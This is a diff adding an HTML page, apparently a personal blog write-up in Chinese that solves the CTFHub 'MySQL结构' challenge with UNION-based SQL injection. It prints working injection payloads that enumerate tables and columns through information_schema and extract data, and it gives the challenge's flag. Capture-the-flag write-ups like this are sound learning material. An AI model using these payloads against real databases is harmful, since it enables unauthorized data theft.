@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: MySQL结构 - CTFHub Web 入门</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.1rem; margin: 1.5rem 0 0.8rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { display: inline-flex; align-items: center; gap: 8px; color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; font-size: 0.95rem; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); transform: translateY(-3px); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctfhub.html"><i class="fas fa-arrow-left"></i> 返回 CTFHub 题库</a>
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> MySQL结构 - CTFHub Web 入门 Writeup</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月18日</span>
+            <span><i class="fas fa-tag"></i> CTFHub</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> 联合查询</span>
+        </div>
+
+        <p>这道题叫“MySQL结构”，一开始我完全不知道是什么意思。经历了环境过期、随机表名、语法写错等折磨后，我终于搞懂了：**所谓“MySQL结构”，就是让你去查数据库的“户口本”，摸清库里有哪些表、表里有哪些列，最后顺藤摸瓜拿到数据。**</p >
+
+        <h2>一、题目原理与核心概念（大白话解释）</h2>
+        <div style="background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem;">
+            <p><strong>1. 什么是“MySQL结构”？</strong> MySQL 数据库就像一个“档案馆”，有总库、表、列。这道题不让你直接拿数据，而是让你通过注入，一步步把表名、列名查出来，这就是查“结构”。</p >
+            <p><strong>2. 核心方法论：联合查询注入</strong>。利用 <code>union select</code> 强行把我们要查的内容，拼接到页面上原本显示 <code>Data</code> 的位置。</p >
+            <p><strong>3. 关键概念“回显位”</strong>。页面哪一列能被我们控制、能显示查询结果，它就是我们的“话筒”。</p >
+        </div>
+
+        <h2>二、保姆级解题步骤（每一行代码都在干什么）</h2>
+        <p>⚠️ 核心提示：输入框可能有限制，如果报错，请在浏览器地址栏直接拼接 URL（将空格替换为 <code>+</code>）。</p >
+
+        <h3>第 1 步：测出“话筒”在哪一列（测试回显位）</h3>
+        <p><strong>输入：</strong></p >
+        <pre><code>1 union select 1, 2</code></pre>
+        <p><strong>运行结果：</strong> 页面显示 <code>ID: 1</code> 和 <code>Data: ctfhub</code>（显示的是原本查到的数据，不是我们注入的 2）。</p >
+        <p><strong>代码逐字翻译：</strong></p >
+        <ul>
+            <li><code>1</code>：让数据库先查 id=1 的内容。</li>
+            <li><code>union</code>：联合查询，意思是“除了前面查到的，我强行再追加一条我指定的查询”。</li>
+            <li><code>select 1, 2</code>：强行追加一条只有 <code>1</code> 和 <code>2</code> 的结果。</li>
+        </ul>
+        <p><strong>为什么没显示 2？</strong> 因为数据库优先返回了 id=1 的真实数据。</p >
+        <p><strong>破局关键：</strong> 改用 <code>-1</code> 让前面的查询查不到东西。</p >
+        <p><strong>输入：</strong></p >
+        <pre><code>-1 union select 1, 2</code></pre>
+        <p><strong>运行结果：</strong> 页面显示 <code>ID: 1</code> 和 <code>Data: 2</code>。</p >
+        <p><strong>结论：</strong> <strong>第二列（Data）就是我们的“话筒”（回显位）！</strong> 我们可以把要查的东西放在第二个位置。</p >
+
+        <h3>第 2 步：查数据库里有哪些表（查表名）</h3>
+        <p><strong>输入：</strong></p >
+        <pre><code>-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre>
+        <p><strong>运行结果：</strong> 页面 <code>Data:</code> 后面显示类似 <code>news,xxrqumkstl</code> 的字符串。</p >
+        <p><strong>代码逐字翻译：</strong></p >
+        <ul>
+            <li><code>-1 union select 1, 2</code>：老规矩，抢过话筒。</li>
+            <li><code>group_concat(table_name)</code>：把查到的所有表名，用逗号拼成<strong>一行</strong>（因为页面只能显示一行数据）。</li>
+            <li><code>from information_schema.tables</code>：从系统自带的“表名档案室”里查。</li>
+            <li><code>where table_schema=database()</code>：条件限制为“当前所在的数据库”。</li>
+        </ul>
+        <p><strong>踩坑提醒：</strong> 这里的 <code>xxrqumkstl</code> 是系统**随机生成**的表名，每次开启新环境都会变！必须用这一步查出来的真实表名，不能瞎猜。</p >
+
+        <h3>第 3 步：查这张表里有哪些列（查列名）——【你踩坑的地方】</h3>
+        <p><strong>错误示范：</strong> 输入 <code>...where table_name='xxrqumkstl,news'</code>，页面 <code>Data:</code> 变成空白。</p >
+        <p><strong>原因分析：</strong> 数据库中根本没有叫 `xxrqumkstl,news` 的“连体婴”表。SQL 语法中，<code>table_name</code> 只能等于**一个**确定的表名。</p >
+        <p><strong>正确输入：</strong></p >
+        <pre><code>-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='xxrqumkstl'</code></pre>
+        <p><strong>代码逐字翻译：</strong></p >
+        <ul>
+            <li><code>group_concat(column_name)</code>：把查到的列名拼成一行。</li>
+            <li><code>from information_schema.columns</code>：去系统自带的“列名登记册”里查。</li>
+            <li><code>where table_name='xxrqumkstl'</code>：限定条件是“这张叫 xxrqumkstl 的表”。</li>
+        </ul>
+        <p><strong>运行结果：</strong> 页面显示类似 <code>id,data</code> 或 <code>id,flag</code>。记下这个列名（假设是 <code>data</code>）。</p >
+
+        <h3>第 4 步：一击致命，提取 Flag（查数据）</h3>
+        <p><strong>输入：</strong></p >
+        <pre><code>-1 union select 1, data from xxrqumkstl</code></pre>
+        <p><strong>代码翻译：</strong> 去 <code>xxrqumkstl</code> 这张表里，把 <code>data</code> 这一列的内容掏出来。</p >
+        <p><strong>最终 Flag：</strong> <code>ctfhub{222ff04a94d5f427ff2b2172}</code></p >
+
+        <h2>三、踩坑启示录</h2>
+        <div style="background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; border-radius: 0 8px 8px 0;">
+            <p>💡 <strong>不要用脚本死磕环境：</strong> CTFHub 环境极易过期，导致脚本跑一半断掉（比如上次跑出 `có` 或 `ctfhub` 就停下）。手工利用回显位注入反而最快。</p >
+            <p>💡 <strong>随机表名是陷阱：</strong> 题目故意把表名设成 `xxrqumkstl` 这种随机字符串，逼迫你必须用 `information_schema` 去查结构，不能瞎猜。</p >
+            <p>💡 <strong>语法细节决定成败：</strong> 查列名时，`table_name` 后面只能跟一个表名。混入逗号会导致 SQL 语法错误，返回空白。</p >
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p >
+
+        <div class="action-bar">
+            <a href="/ctfhub.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTFHub 题库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
